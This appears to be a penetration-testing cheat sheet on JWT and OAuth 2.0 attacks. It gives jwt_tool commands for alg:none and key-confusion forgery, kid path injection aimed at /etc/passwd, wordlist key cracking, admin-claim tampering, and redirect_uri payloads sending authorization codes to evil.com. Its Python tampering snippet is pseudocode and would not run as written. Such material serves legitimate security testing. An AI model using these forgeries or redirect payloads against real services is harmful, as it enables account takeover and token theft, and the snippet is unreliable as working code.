# JWT + OAuth 2.0 security testing

## JWT attack surface

### 1. Algorithm confusion

```bash
# alg:none — the most classic
# Original: {"alg":"RS256","typ":"JWT"}.payload.signature
# Attack: {"alg":"none","typ":"JWT"}.payload. (empty signature)

# RS256 → HS256 key obfuscation
# If the server uses RS256 public key for HS256 verification
# You can use the public key as an HMAC key to sign
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid inject
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# The server uses the content of the file pointed by kid as the HMAC key
```

### 2. jwt_tool complete usage

```bash
# full scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# Weak key blasting
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Statement of tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA key obfuscation
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Embed JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT tampering

```python
import jwt
import base64

# Decode (not verify)
header, payload, sig = jwt.split('.')

# Tamper with payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 attack surface

### Authorization Code Grant

```text
1. redirect_uri control
Normal: https://app.com/callback?code=AUTH_CODE
Attack: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
Open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via state is missing
No state parameter → The attacker binds the victim session with his own code

3. PKCE missing
No code_challenge → Authorization code interception attack

4. Token leaked in Referer
The callback page loads external resources → Referer header contains code/token
```

### Implicit Grant (deprecated but still deployed)

```text
1. access_token leaks in URL fragment → Referer
2. token in browser history → physical access risk
3. No client authentication → token substitution attack
```

### Client Credentials Grant

```text
1. client_secret leak (frontend/mobile hardcoded)
2. Over scope grant
3. No client speed limit → brute force enumeration
```

### Generic OAuth Test

```text
□ Test scope improvement: scope=read → scope=read%20write
□ Token replay: use old access_token to access new resources
□ Refresh token abuse: refresh_token indefinitely renewed
□ Cross-tenant access: tenant A’s token access tenant B
□ Token leaked in log/URL/Referer
```

## tool

```bash
# JWT test
pip install jwt-tool pyjwt

# OAuth test
# Burp Suite + OAuth Scanner extension
# Postman OAuth 2.0 process test

# automation
# Entropy: Automatic JWT tampering + OAuth redirect_uri testing
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
